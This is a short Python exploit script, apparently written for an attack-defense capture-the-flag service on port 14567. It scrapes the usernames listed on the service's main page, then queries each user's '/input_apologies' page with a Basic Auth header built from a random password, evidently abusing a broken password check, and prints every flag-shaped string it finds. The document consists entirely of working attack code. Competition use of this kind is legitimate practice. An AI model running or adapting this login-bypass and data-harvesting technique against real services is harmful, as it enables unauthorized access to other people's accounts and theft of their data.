from string import  ascii_letters
from base64 import b64encode
from random import choice
import requests as rq
import sys 
import re

def gen_random_string(N=10):
	return "".join(choice(ascii_letters) for i in range(N))

def create_headers(username, password):
	auth_string = b64encode("{}:{}".format(username, password).encode()).decode()
	headers = {"Authorization":"Basic {}".format(auth_string)}
	return headers

try:
	host = sys.argv[1]
except:
	host = "127.0.0.1"
url = "http://{}:14567".format(host)

url_register = url + "/register"
password = gen_random_string()
res_main_page = rq.get(url)
mass_login = re.findall(r"<tr>\n<td>(\w+)</td>", res_main_page.text)[1:]
for login in mass_login:
	headers = create_headers(login, password)
	url_input_apology = url + "/input_apologies"
	res_input_apology = rq.get(url_input_apology, headers=headers)
	mass_flags = re.findall(r"\w{31}=", res_input_apology.text)
	for flag in mass_flags:
		print(flag)
